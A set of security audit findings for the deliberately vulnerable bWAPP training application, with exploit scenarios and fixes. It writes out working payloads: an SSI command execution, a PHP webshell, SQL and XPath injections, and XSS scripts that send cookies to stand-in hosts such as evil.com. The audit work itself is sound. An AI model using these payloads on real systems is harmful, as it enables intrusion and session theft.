findings.description: This file is a deliberately vulnerable portal page that links to a vulnerable Drupal instance at `../drupal/` (line ~94: `Drupal`). It explicitly references CVE-2014-3704, the Drupal 7 pre-authentication SQL injection in the expandArguments() function of `includes/database/database.inc`. The actual SQLi sink is NOT in this PHP file — it resides in the Drupal codebase bundled with bWAPP/bee-box. An attacker sends a crafted POST request to the Drupal instance's menu router callback with a specially structured nested array in form parameters, causing Drupal's database abstraction layer to generate a query with an attacker-controlled table suffix, enabling arbitrary SQL execution. Because the vulnerable code (the Drupal core) is not present in this specific file, confidence is reduced; the finding is that this page confirms the bundled Drupal is intentionally vulnerable.
findings.exploit_scenario: An attacker sends a POST request to `../drupal/` (or its `q=user` endpoint) with form data containing a crafted nested array parameter such as `name[0;INSERT INTO users (uid,name,pass,status) VALUES (1,'admin','$S$hash',1);-- ]=value`. The Drupal database layer fails to sanitize the array key, allowing the injected SQL fragment to be appended to the query, achieving pre-authentication RCE via SQL injection into the admin account and subsequent PHP code execution via Drupal features.
findings.recommendation: The bundled Drupal instance should be patched to Drupal 7.32 or later. This is the well-known Drupageddon fix. Additionally, the bWAPP application should only be deployed in isolated lab environments.

findings.title: SSI injection via unsanitized firstname/lastname written to .shtml file enables RCE
findings.description: User-supplied POST parameters `firstname` and `lastname` (line 43-44) are processed through `xss()` which, at security_level 0 (default), applies `no_check()` — no sanitization whatsoever. The values are concatenated directly into an HTML string (line 57) that is written to `ssii.shtml` (lines 59-61). The server then redirects the user to `ssii.shtml` (line 63), which an SSI-enabled web server will parse and execute any embedded SSI directives. Because `<!--#exec cmd="..."-->` and `<!--#include virtual="..."-->` use HTML comment syntax, even security levels 1/2 (`xss_check_4`, `xss_check_3`) which target XSS patterns may not block SSI directives — but level 0 is trivially exploitable.
findings.exploit_scenario: An attacker sends POST request with firstname=`<!--#exec cmd="cat /etc/passwd" -->` and lastname=`x`. At security level 0, no_check is applied. The payload is written into ssii.shtml. The redirect causes the server's SSI engine to execute the command, and the contents of /etc/passwd are rendered in the response body. This yields full server-side command execution as the web server user.
findings.recommendation: Sanitize user input to strip or reject SSI directive patterns (anything matching `<!--#`). Apply a whitelist allow-list of characters (e.g., alphanumeric plus spaces) for firstname/lastname fields before writing to any server-parsed file. Better yet, do not write user input into server-parsed file types (.shtml, .shtm, .stm).

findings.title: Unrestricted file upload allows arbitrary PHP file upload leading to RCE
findings.description: At security_level 0 (line 33) and in the default case (line 57), the user-supplied uploaded file is moved directly to `images/` with zero validation on file type, extension, or content. The filename (`$_FILES["file"]["name"]`) is fully attacker-controlled and concatenated directly into the destination path of `move_uploaded_file()`. An attacker can upload a `.php` file and then request it over HTTP to execute arbitrary code on the server.
findings.exploit_scenario: An attacker uploads a file named `shell.php` containing `<?php system($_GET['c']); ?>` via the upload form. The server places it at `images/shell.php`. The attacker then requests `images/shell.php?c=id` to execute arbitrary OS commands, achieving full RCE.
findings.recommendation: Validate the file extension against an explicit allowlist of safe image types (e.g., jpg, png, gif). Additionally, validate the MIME type server-side (e.g., via `finfo_file()`), and store uploaded files with server-generated filenames to prevent both code execution and path traversal.

findings.title: Security level read from user-controlled cookie allows bypassing upload validation
findings.description: The security level that gates upload validation is read from `$_COOKIE["security_level"]` (line 30). This cookie is fully attacker-controlled. By setting `security_level=0` (or any value not matching "1" or "2", which falls through to the default case), an attacker completely bypasses the file type checks enforced by `file_upload_check_1()` (line 38) and `file_upload_check_2()` (line 47). Even the "high" security setting becomes opt-in from the attacker's perspective.
findings.exploit_scenario: An attacker sets the cookie `security_level=0` in their browser or HTTP client (e.g., `curl -b "security_level=0"`), then uploads `shell.php`. The switch statement hits case "0", which performs no validation, and the malicious file is stored on the server.
findings.recommendation: The security level must be stored server-side (e.g., in the session or a database) and must not be trustable from a client-supplied cookie value. Alternatively, remove the cookie-based dispatch entirely and always enforce strict upload validation.

findings.title: Path traversal via uploaded filename allows writing files outside images/ directory
findings.description: In all security levels (lines 33, 42, 52, 57), the uploaded filename `$_FILES["file"]["name"]` is directly concatenated into the destination path `"images/" . $_FILES["file"]["name"]`. No sanitization or basename() call is applied. An attacker can supply a filename containing `../` sequences to write the uploaded file to an arbitrary directory on the filesystem. This applies even when extension checking is active (level 2), since the path traversal occurs in the filename component before the extension.
findings.exploit_scenario: An attacker sets their filename to `../../htdocs/backdoor.php` (or `../backdoor.php`). The call becomes `move_uploaded_file($tmp, "images/../../htdocs/backdoor.php")`, which resolves to `htdocs/backdoor.php` — outside the intended `images/` directory. This could overwrite existing files or place a webshell in a more accessible location.
findings.recommendation: Always apply `basename()` to the user-supplied filename before using it in a path. Better yet, generate a random server-side filename and store only the mapping.

findings.title: Stored XSS via unsanitized uploaded filename reflected in HTML output
findings.description: After a successful upload, the filename is embedded directly into the HTML response without encoding (line 134): `echo "The image has been uploaded <a href=\"images/" . $_FILES["file"]["name"] . "\" ...`. An attacker can craft a filename containing HTML/JavaScript (e.g., `" onload="alert(1)` or `"><script>alert(1)</script>`) which is stored on the page and executed when the upload result is rendered. This is a reflected XSS via the multipart filename — the payload persists in the response context of the upload.
findings.exploit_scenario: An attacker uploads a file named `test"><script>document.location='http://evil.com/steal?c='+document.cookie</script>.jpg`. When the upload completes, the server renders this filename inline in the HTML. The script executes in the victim's browser, stealing session cookies.
findings.recommendation: Apply HTML entity encoding (e.g., `htmlspecialchars()`) to the filename before embedding it in HTML output. Additionally, apply `basename()` to strip any path components.

findings.title: Upload validation in level 2 relies on unseen external function that may be bypassable
findings.description: At security level 2, `file_upload_check_2($_FILES["file"], array("jpg","png"))` is called (line 47), but this function is defined in the external `functions_external.php` which is not in scope. Even if it checks the file extension, it may not validate MIME type or file content (magic bytes), allowing an attacker to upload a PHP file renamed to `.jpg`. If the server is misconfigured to execute PHP in `.jpg` files (e.g., via Apache AddHandler), or if a local file inclusion exists elsewhere, this becomes exploitable. Combined with the cookie bypass (finding 02), this check is trivially circumvented anyway.
findings.exploit_scenario: An attacker uploads `shell.jpg` containing `<?php system($_GET['c']); ?>`. The extension check passes. If a separate LFI vulnerability exists, the attacker includes `images/shell.jpg` to execute the PHP code. Alternatively, if the server executes PHP in image files, direct access achieves RCE.
findings.recommendation: In addition to extension allowlisting, validate the actual file content (MIME type via `finfo_file()`, magic bytes). Regenerate the image using GD/Imagick to strip embedded code. Store uploads outside the webroot or configure the server to not execute PHP in the upload directory.

findings.title: SQL injection in SOAP endpoint via unsanitized title parameter
findings.description: The `get_tickets_stock` function receives the `title` argument directly from the parsed SOAP request body (line 41: `$server->service($HTTP_RAW_POST_DATA)`). NuSOAP deserializes the SOAP envelope and invokes the registered PHP function, passing the attacker-controlled `title` string. On line 8, this value is concatenated verbatim into a SQL SELECT statement without any sanitization or parameterization: `$sql = "SELECT tickets_stock FROM movies WHERE title = '" . $title . "'"`. The resulting query is executed via `mysql_query()` on line 9. Because the input is injected directly into the SQL string literal, an attacker can break out of the quoted context using a single quote and append arbitrary SQL.
findings.exploit_scenario: An attacker sends a crafted SOAP request to ws_soap.php with the `title` parameter set to `' UNION SELECT secret FROM users --`. The NuSOAP server parses this, calls `get_tickets_stock("' UNION SELECT secret FROM users --")`, and the resulting query becomes `SELECT tickets_stock FROM movies WHERE title = '' UNION SELECT secret FROM users --'`. The attacker receives the contents of the `users` table reflected back in the SOAP response (as the function return value). Any table in the MySQL database can be read, potentially including admin credentials or PII.
findings.recommendation: Use parameterized queries instead of string concatenation. Replace the `mysql_query` call with PDO prepared statements or, at minimum, wrap `$title` with `mysql_real_escape_string($title)`. Note that the `mysql_*` extension is deprecated/removed in modern PHP — migrating to PDO or mysqli is also recommended.

findings.title: XPath injection in login form allows authentication bypass and data extraction
findings.description:
The user-supplied `login` and `password` request parameters (lines 56–63) are passed through the `xmli()` function, which at security level 0 (the default) applies `no_check()` — effectively no sanitization. The unsanitized values are then directly interpolated into an XPath query string on line 70:

```php
$result = $xml->xpath("/heroes/hero[login='" . $login . "' and password='" . $password . "']");
```

An attacker can break out of the intended XPath predicate and inject arbitrary XPath expressions. A successful injection causes the query to return a non-empty result (the first matching `<hero>` node), which the application treats as a successful login, displaying that hero's login name and secret (line 77). Beyond auth bypass, XPath injection can be used to systematically extract all data from the XML document using boolean-blind or error-based techniques.
findings.exploit_scenario:
An attacker sends a GET request with:
- `login` = `' or '1'='1`
- `password` = `' or '1'='1`

The resulting XPath becomes:
```
/heroes/hero[login='' or '1'='1' and password='' or '1'='1']
```
Due to XPath operator precedence (`and` binds tighter than `or`), the predicate evaluates to true for every hero node. The application authenticates the attacker as the first hero and displays that hero's secret. Further, the attacker can extract arbitrary node values using boolean-blind XPath injection (e.g., `login` = `' or substring(//hero[2]/password,1,1)='t`) to read all passwords/secrets from the XML file.
findings.recommendation: Never interpolate untrusted input into XPath queries. Use a safe XPath API or parameterized approach. If manual construction is unavoidable, strictly validate/sanitize input against a whitelist of expected characters (e.g., alphanumeric only). PHP has no native parameterized XPath, so the `xmli_check_1` defense (applied at security levels 1–2) should be enforced by default — ensure it escapes single quotes and other XPath metacharacters, or rejects input containing them.

findings.title: XPath injection via unsanitized genre parameter in search query
findings.description: Untrusted input enters at `$_REQUEST["genre"]` (line ~112). It passes through `xmli()` which, when the `security_level` cookie is "0" or absent, calls `no_check()` — a no-op sanitization function. The value is then directly interpolated into an XPath expression at line 124: `$xml->xpath("//hero[contains(genre, '$genre')]/movie")`. An attacker controls `$genre` completely, allowing arbitrary XPath predicates to be injected. The XML file loaded is `passwords/heroes.xml` (line 121), which based on its directory name likely contains credential data (logins/passwords) that can be extracted via blind or union-based XPath injection.
findings.exploit_scenario: An attacker sends a GET request with `genre=')] | //login | //password | contains(genre,'` (or similar XPath union payload). This breaks out of the `contains()` predicate and unions in other XML nodes — such as `<login>` and `<password>` elements from `passwords/heroes.xml` — into the result set. The extracted credentials are then rendered in the HTML table at line 136 (`echo $row`). Alternatively, for blind extraction, an attacker can use boolean-based XPath injection like `genre=action'] and substring(//login[1],1,1)='a` to infer credential characters one at a time.
findings.recommendation: Use parameterized XPath queries if the library supports them, or apply strict input validation (whitelist of allowed genre values such as "action", "horror", "sci-fi") before interpolation. At minimum, escape single quotes in user input for XPath contexts. The XML file containing credentials should also be moved outside the web-accessible document root.

findings.title: Reflected XSS via unescaped XPath result output
findings.description: The XPath query result nodes are echoed directly into HTML at line 136: `<?php echo $row;?>` without `htmlspecialchars()` encoding. If an attacker can control or influence the content of `passwords/heroes.xml` (e.g., through another vulnerability that writes to that file), or if the XPath injection from F-00-01 is used to select nodes whose text content includes HTML, that content would be rendered as live HTML in the victim's browser.
findings.exploit_scenario: Combined with the XPath injection in F-00-01, an attacker crafts a payload that causes the XPath engine to return node values containing `<script>alert(document.cookie)</script>`. If shared infrastructure or another endpoint allows writing to the heroes.xml file, the stored payload renders as XSS for any user viewing search results. Even without XML write access, the lack of output encoding is a defense-in-depth gap.
findings.recommendation: Always escape output with `htmlspecialchars($row, ENT_QUOTES, 'UTF-8')` before echoing into HTML. This should be applied at line 136 and line 133.

findings.title: Stored XSS via unsanitized session login variable
findings.description: The application outputs the `login` value from the `$_SESSION` superglobal directly into the HTML document without output encoding on line 58. If the application's authentication or user registration mechanism permits users to set their usernames to include arbitrary HTML/JavaScript, the payload will be stored and executed in the browser of any user viewing this page. The sink is `echo ucwords($_SESSION["login"]);`.
findings.exploit_scenario: An attacker registers a new account or changes their username to `<script>fetch('http://attacker.com/?cookie=' + document.cookie)</script>`. Upon logging in and navigating to `xss_ajax_1-1.php`, the malicious script executes in the context of their session. If an administrative user can be tricked into viewing the attacker's account or if the session is shared, the script executes in their context, leading to session hijacking.
findings.recommendation: Apply context-appropriate output encoding to the session variable before rendering it in the HTML. Use `htmlspecialchars($_SESSION["login"], ENT_QUOTES, 'UTF-8')` to escape HTML entities and prevent script execution.

findings.title: Reflected XSS via unsanitized user input echoed in AJAX XML response
findings.description: The `title` GET parameter is retrieved on line 50 (`$title = $_GET["title"]`). When the title does not match any known movie (fails the `in_array` check on line 57 and is not empty on line 59), it is passed through the `xss()` function and echoed directly into the XML response body on line 60: `echo xss($title) . "??? Sorry, we don't have that movie :(";`. At security_level 0 (the default), the `xss()` function calls `no_check()` which performs no sanitization. The raw attacker-controlled string is embedded inside the `<response>` XML element. An attacker can break out of the `<response>` tag and inject arbitrary XML/HTML content, including `<script>` elements or event-handler attributes. While the response Content-Type is `text/xml`, the referring AJAX page (the HTML page that calls this endpoint) may insert the response content into the DOM via `innerHTML` or similar unsafe sinks, causing script execution in the user's browser context.
findings.exploit_scenario: An attacker crafts a URL such as `http://target/xss_ajax_1-2.php?title=</response><script>alert(document.cookie)</script><response>`. At security level 0, the server returns an XML response containing the injected `<script>` tag. When the calling AJAX page retrieves and renders this response into the DOM, the JavaScript executes, stealing the victim's session cookie. Alternatively, direct navigation to the URL in a browser that performs content-type sniffing (or with an injected Content-Type override) can trigger script execution.
findings.recommendation: Apply output encoding appropriate for XML context at the point of emission (line 60). Encode `<`, `>`, `&`, `"`, and `'` to their XML entity equivalents (`<`, `>`, `&`, `"`, `'`). Additionally, the calling AJAX page should use safe DOM APIs (e.g., `textContent` instead of `innerHTML`) when inserting response data into the page.

findings.title: XSS via eval() used to parse JSON response (low/medium security levels)
findings.description: At security levels 0 (low) and 1 (medium), the server response from xss_ajax_2-2.php is parsed using eval() instead of JSON.parse(). The user-controlled movie title is sent via GET to xss_ajax_2-2.php (line 105), which presumably reflects it inside a JSON response. Because eval() executes the response text as JavaScript, an attacker can craft a title payload that breaks out of the expected JSON structure and injects arbitrary JavaScript. The branch is selected by the security_level cookie (line 118 vs 131). At security_level != 2, the eval branch is active.
findings.exploit_scenario: An attacker types a crafted movie title such as `"}]}; alert(document.cookie);//` into the search field. The value is URL-encoded and sent to xss_ajax_2-2.php, which reflects it unsanitized into the JSON response body. The eval() call on line 131 executes the injected JavaScript, stealing session cookies or performing actions as the victim user.
findings.recommendation: Always use JSON.parse() to deserialize JSON data, regardless of security level. Remove the eval() branch entirely. If backward compatibility is not needed, delete lines 128-134 and keep only the JSON.parse() branch.

findings.title: XSS via innerHTML assignment of server-controlled JSON response field
findings.description: After parsing the JSON response (whether via eval or JSON.parse), the code extracts result = JSONResponse.movies[0].response (line 140) and assigns it directly to innerHTML on line 142: `document.getElementById("result").innerHTML = result;`. If the server-side script xss_ajax_2-2.php reflects the user-supplied title into the JSON "response" field without HTML-entity-encoding it, the innerHTML assignment will render arbitrary HTML including script tags, event handlers, or img onerror payloads. This sink is reachable at ALL security levels, including level 2 (high), because it occurs after the JSON parsing regardless of which parser was used.
findings.exploit_scenario: An attacker enters `` as the movie title. The server reflects this into the JSON response's "response" field. Even at security level 2 where JSON.parse() is used, the innerHTML assignment on line 142 renders the HTML, firing the onerror handler and executing JavaScript in the victim's browser context.
findings.recommendation: Use textContent instead of innerHTML to insert the result into the DOM, or sanitize/HTML-encode the response value before assignment. For example: `document.getElementById("result").textContent = result;`

findings.title: Reflected XSS via attacker-controlled bWAPP HTTP request header
findings.description: The page reads all HTTP request headers with getallheaders(), finds the "bWAPP" header, and echoes its value into the HTML response. At the default security level (cookie "security_level" = "0" or absent), the xss() function delegates to no_check(), which performs no sanitization whatsoever. The raw attacker-controlled header value is placed inside <i> tags and emitted directly: `echo "" . xss($value) ."";` (line ~101). The default case in the switch also falls through to no_check(), meaning any user without an explicit security level cookie is vulnerable.
findings.exploit_scenario: An attacker crafts an HTTP request with the header `bWAPP: <script>alert(document.cookie)</script>` and lures a victim into visiting the resulting page (e.g., via a form submission from a malicious site that sets custom headers via fetch API, or through a tool like Burp Suite in a proxy-based attack). The victim's browser renders the script, sending session cookies to the attacker. Alternatively, any mechanism that lets the attacker inject custom headers (e.g., CORS-misconfigured cross-origin fetch, Flash-based request) can trigger this.
findings.recommendation: Apply context-aware output encoding (HTML entity encoding) to the header value before embedding it in the page, regardless of security level. For example: `echo "" . htmlspecialchars($value, ENT_QUOTES, "UTF-8") . "";`. Ensure this encoding is always applied rather than gated behind a configurable security level.

findings.title: Reflected XSS via HTTP Referer header in back-button onClick handler
findings.description:
The value of $_SERVER["HTTP_REFERER"] — a fully attacker-controlled HTTP header — is echoed into a JavaScript string literal inside an HTML onClick attribute at line 113:

```
onClick="document.location.href='<?php echo isset($_SERVER["HTTP_REFERER"]) ? xss($_SERVER["HTTP_REFERER"]) : ""?>'"
```

At security_level 0 (low), the `xss()` function (line 24) calls `no_check()` (line 32), which returns the input unchanged. The Referer value is therefore injected raw into a JS single-quoted string within a double-quoted HTML attribute, enabling breakout via a single quote `'` into the JavaScript context and subsequently into the HTML attribute context.

Even at higher security levels, the sanitizers `xss_check_4` and `xss_check_3` (defined in functions_external.php) are typically designed for HTML-body context (encoding `<` and `>`) and may not properly escape characters meaningful in JavaScript string context (`'`, `\`, etc.), leaving the injection viable.
findings.exploit_scenario:
An attacker sends a crafted HTTP request to xss_back_button.php with a malicious Referer header, for example:

```
Referer: x';alert(document.cookie);//
```

At security level 0, this produces:

```html
onClick="document.location.href='x';alert(document.cookie);//'"
```

When the victim views this page and sees the rendered button, the JavaScript in the onClick handler executes the injected `alert(document.cookie)`. An attacker can steal session cookies, perform actions as the victim, or redirect to a phishing page. The Referer header can be set by the attacker by hosting a link to the target page from an attacker-controlled page, or by using curl/HTTP client libraries directly.
findings.recommendation: Do not reflect user-controlled HTTP headers into HTML/JavaScript output. Instead, use a server-side whitelist or generate the back URL from server-side navigation state. If reflection is necessary, apply context-appropriate encoding: for JS-string-inside-HTML-attribute context, encode single quotes, double quotes, backslashes, and angle brackets (e.g., using both `json_encode()` and `htmlspecialchars()`). At minimum, replace the `xss()` dispatch so all levels apply `htmlspecialchars($data, ENT_QUOTES)` or equivalent.

findings.title: Reflected XSS via GET parameters firstname/lastname at security level 0
findings.description: Untrusted user input enters via $_GET["firstname"] and $_GET["lastname"] (lines 98-99). When neither field is empty, both values are passed through the xss() helper (line 114) and concatenated directly into an HTML echo statement: `echo "Welcome " . xss($firstname) . " " . xss($lastname);`. The xss() function dispatches on $_COOKIE["security_level"]. At level "0" (the default), it calls no_check() which returns the data unchanged, providing zero sanitization. An attacker-controlled GET parameter is thus reflected verbatim into the HTML response body with no encoding or escaping.
findings.exploit_scenario:
An attacker crafts a URL such as:
http://target/xss_get.php?firstname=%3Cscript%3Ealert(document.cookie)%3C/script%3E&lastname=Smith
and sends it to a victim. When the victim (whose security_level cookie is "0" or unset, hitting the default branch) clicks the link, the server renders: "Welcome <script>alert(document.cookie)</script> Smith". The script executes in the victim's browser context, enabling session hijacking, credential theft, or further payload delivery. Because parameters are GET-based, the payload is embedded directly in the URL — trivially distributable via email, chat, or any link-sharing vector.
findings.recommendation: Apply context-aware output encoding at the point of injection. For HTML body context, use htmlspecialchars($data, ENT_QUOTES, 'UTF-8') on firstname and lastname before echoing. Do not rely on a cookie-controlled switch for security; always encode by default. Ideally, also set Content-Security-Policy headers as a defense-in-depth measure.

findings.title: Stored XSS via unsanitized session login echoed in navigation
findings.description: The value `$_SESSION["login"]` is echoed directly into HTML via `echo ucwords($_SESSION["login"])` without HTML encoding (line 76). `ucwords()` does not sanitize HTML entities. If a user can set their username to contain arbitrary HTML/JavaScript during registration (e.g., via `user_extra.php`), the payload is stored in the session and rendered on every page load. The data flow is: user-controlled username → stored in session at login → echoed without encoding on line 76 into a `<font>` tag context. This renders in the browser of any page including this template.
findings.exploit_scenario: An attacker registers a username like `<script>alert(1)</script>` via user_extra.php, logs in with that account, and the JavaScript executes on every page that includes this navigation header, including this one. If an admin views the same application context, the script runs in their browser.
findings.recommendation: Encode the session login value before output: `echo htmlspecialchars(ucwords($_SESSION["login"]), ENT_QUOTES, "UTF-8");`

findings.title: HREF XSS — attack surface entry form submits untrusted name to xss_href-2.php without client-side validation
findings.description: This page (xss_href-1.php) is the input stage of the reflected HREF XSS flow. The form on line 67–72 collects an untrusted `name` parameter via GET and submits it to `xss_href-2.php`. Based on the page title "XSS - Reflected (HREF)" and the naming convention, the companion sink file `xss_href-2.php` is expected to reflect this `name` value into an `href` attribute of an anchor tag without adequate sanitization. The attack flow begins here: attacker crafts a malicious `name` value → submitted to `xss_href-2.php` → reflected into `href` attribute → victim clicks the link → JavaScript executes via `javascript:` URI scheme. The vulnerability sink is in xss_href-2.php (not provided for review).
findings.exploit_scenario: An attacker crafts a URL like `xss_href-2.php?name=javascript:alert(document.cookie)` and sends it to a victim. When the victim views the result page and clicks the link containing their "name", the JavaScript URI executes in their browser context, stealing session cookies.
findings.recommendation: In xss_href-2.php, validate that the reflected name is a safe URL scheme (allowlist `http://` and `https://`), and HTML-encode the value with `htmlspecialchars()` when embedding it in href attributes. Apply the same encoding on this form's input side for defense-in-depth.

findings.title: Reflected XSS via untrusted input injected into unquoted href attribute at security level 0
findings.description:
The `name` GET parameter is read at line ~30 (`$name = $_GET["name"]`) with no encoding applied. It is then embedded into an unquoted `href` attribute at line 137:

```html
<a href=xss_href-3.php?movie=...&name=<?php echo hpp($name);?>&action=vote>
```

The `hpp()` function (lines 40-62) dispatches on `$_COOKIE["security_level"]`. At level 0 (default) it calls `no_check($data)`, which returns the input unchanged. Because the href attribute value is **unquoted**, a space character in `$name` breaks out of the attribute context, allowing injection of arbitrary HTML event-handler attributes. Note that `xss_check_3()` is applied to `$name` only in the `$message` output (line 34), NOT in the href context.
findings.exploit_scenario:
An attacker crafts a URL such as:
```
http://target/xss_href-2.php?name=foo%20onclick=alert(document.cookie)%20x=
```
The `hpp()` function at security level 0 returns this verbatim, producing:
```html
<a href=xss_href-3.php?movie=1&name=foo onclick=alert(document.cookie) x=&action=vote>
```
The browser parses `href=xss_href-3.php?movie=1&name=foo`, then a separate `onclick=alert(document.cookie)` attribute, and `x=&action=vote`. When any victim clicks the "Vote" link, the injected `onclick` JavaScript executes in their browser session, enabling cookie theft or further payload delivery. The link could be delivered via phishing email or forum post.
findings.recommendation:
1. Always quote HTML attribute values: change `href=xss_href-3.php?...` to `href="xss_href-3.php?..."`.
2. Apply `htmlspecialchars($name, ENT_QUOTES, "UTF-8")` to `$name` before embedding it in the href, regardless of security level.
3. Alternatively, apply `urlencode()` consistently at all security levels (as levels 1 and 2 already do).

findings.title: SQL injection via unsanitized movie parameter in SELECT query
findings.description: The `$_REQUEST["movie"]` value flows into `$movie` (line 46), which is concatenated directly into a SQL SELECT query on line 55: `"SELECT * FROM movies WHERE id = '" . sqli_check_2($movie) . "'"`. The function `sqli_check_2()` is a no-op at security level 0 (low), providing no escaping. An attacker-controlled `movie` GET/POST parameter is injected into the query string with no parameterization or effective sanitization at the default security level.
findings.exploit_scenario: An attacker sends a GET request to `xss_href-3.php?name=x&movie=' UNION SELECT 1,2,'<script>alert(document.cookie)</script>',4,5,6,7-- &action=vote`. At security level 0, `sqli_check_2` is a no-op, so the SQL executes the UNION SELECT. The attacker-controlled string is returned as the `title` column and rendered in the page (see F-03-02), achieving both data exfiltration from the database and reflected XSS.
findings.recommendation: Use prepared statements with parameterized queries (PDO or mysqli) instead of string concatenation. Ensure `sqli_check_2` always applies `mysql_real_escape_string` regardless of security level, or better yet, remove the dual-mode pattern entirely.

findings.title: Reflected XSS via unsanitized echo of $message containing database-sourced HTML
findings.description:
The `$message` variable is built on line 63 by embedding `$row["title"]` — a value sourced from the database — directly into an HTML string without `htmlspecialchars()` or any output encoding: `$message = "

Your favorite movie is: " . $row["title"] . "

"`. This `$message` is later echoed raw on line 135: ``. Because the `movie` parameter enables SQL injection (F-03-01), an attacker can use a UNION SELECT to return arbitrary JavaScript as the `title` column value, which is then reflected unsanitized into the response HTML.
findings.exploit_scenario: An attacker crafts: `xss_href-3.php?name=x&movie=' UNION SELECT 1,2,3,'<script>document.location="http://evil.com/steal?c="+document.cookie</script>',5,6,7-- &action=vote`. The UNION SELECT returns the attacker's script as the movie title. Line 63 embeds it in `$message` without encoding. Line 135 renders it into the page, executing arbitrary JavaScript in the victim's browser session, enabling session hijacking.
findings.recommendation: Apply `htmlspecialchars($row["title"], ENT_QUOTES, 'UTF-8')` when embedding database values in HTML output. Do the same for any user/DB-sourced content echoed to the page.

findings.title: Reflected XSS via HPP error message containing unsanitized query string data
findings.description: The function `hpp_check_1(urldecode($_SERVER["QUERY_STRING"]))` on line 42 is called with the full raw query string. If it returns a non-empty `$hpp_error` and the security level cookie is 2 (line 44), the error message is assigned to `$message` and later echoed raw at line 135 without HTML encoding. If `hpp_check_1` reflects portions of the duplicate parameter names/values back in its return string, this creates an XSS path that ironically only triggers at the highest security level.
findings.exploit_scenario: An attacker sends a request with duplicate parameters containing XSS payloads, e.g., `xss_href-3.php?name=x&movie=1&action=vote&name=<script>alert(1)</script>`, while the victim's `security_level` cookie is set to 2. If `hpp_check_1` reports the duplicate parameter name in its error message, the embedded `<script>` tag is rendered and executed.
findings.recommendation: Apply `htmlspecialchars($hpp_error, ENT_QUOTES, 'UTF-8')` before assigning to `$message`, and apply output encoding uniformly at the echo point (line 135) rather than relying on input-side checks.

findings.title: Reflected XSS via innerHTML rendering of unsanitized user input in JSON response
findings.description: At the default (low) security level, `$_GET["title"]` is assigned directly to `$title` without sanitization (line 30). When the title is not a recognized Marvel movie, it is concatenated into a JSON string (line 41): `'{"movies":[{"response":"' . $title . '???..."}]}'`. This string is embedded into a JavaScript block (line 137) as `var JSONResponseString = '…';`, parsed via `JSON.parse` (line 141), and the resulting `response` value is inserted into the DOM using `innerHTML` (line 142). An attacker can supply HTML tags with event handlers (e.g., ``) in the `title` parameter. JSON.parse will successfully parse the string, and innerHTML will render the malicious HTML, executing arbitrary JavaScript in the victim's browser.
findings.exploit_scenario: An attacker crafts a URL: `https://target/xss_json.php?title=`. The server embeds this into the JSON, which parses successfully. The browser renders the `` via innerHTML, the `onerror` fires (because `src=x` fails to load), and the attacker's JavaScript executes in the victim's session context — stealing cookies or performing actions as the victim.
findings.recommendation: Apply output encoding at every layer: (1) JSON-encode the `$title` value before embedding it in the JSON string using `json_encode()`, and (2) use `textContent` instead of `innerHTML` when inserting the parsed response into the DOM, or sanitize the value with a DOMPurify-style allowlist before innerHTML assignment.

findings.title: Reflected XSS via JavaScript string literal breakout in JSON template
findings.description: At the low security level, `$title` (from `$_GET["title"]`, line 30) is concatenated into a JSON template string (line 41) which is then directly embedded into a JavaScript single-quoted string literal on line 137: `var JSONResponseString = '<?php echo $string ?>';`. An attacker can inject a single quote (`'`) to close the string literal, then append arbitrary JavaScript. For example, input `';alert(1);//` produces: `var JSONResponseString = '{"movies":[{"response":"';alert(1);//???..."}]}';` — the first `'` closes the string, `alert(1)` executes, and `//` comments out the rest.
findings.exploit_scenario: An attacker sends a victim a link: `https://target/xss_json.php?title=';alert(document.cookie);//`. The single quote prematurely terminates the JavaScript string literal on line 137, the injected `alert(document.cookie)` executes as inline JavaScript, and `//` neutralizes the trailing content. This achieves full XSS without requiring innerHTML — the code executes during initial page script evaluation.
findings.recommendation: Use `json_encode()` on the full `$string` before embedding it in JavaScript, which will escape single quotes, double quotes, and other special characters. Alternatively, use a proper templating approach that JavaScript can safely consume (e.g., encoding as a JSONP-safe data attribute or using `htmlspecialchars()` with `ENT_QUOTES` when emitting into a JS context).

findings.title: Reflected XSS via PHP_SELF in form action attribute
findings.description: The form action attribute on line 64 outputs `$_SERVER["PHP_SELF"]` after passing it through the `xss()` function. When the security_level cookie is "0" or unset (the default case, lines 25–27 and 40–42), `xss()` delegates to `no_check()`, which returns the input unchanged. `$_SERVER["PHP_SELF"]` is derived from the request URL path and is fully attacker-controlled. An attacker can inject a slash followed by arbitrary characters into the URL path, which become part of PHP_SELF and are reflected unsanitized into the HTML form action attribute, allowing breakout from the attribute and injection of arbitrary HTML/JavaScript.
findings.exploit_scenario:
An attacker crafts a URL like:
  http://target/xss_php_self.php/%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
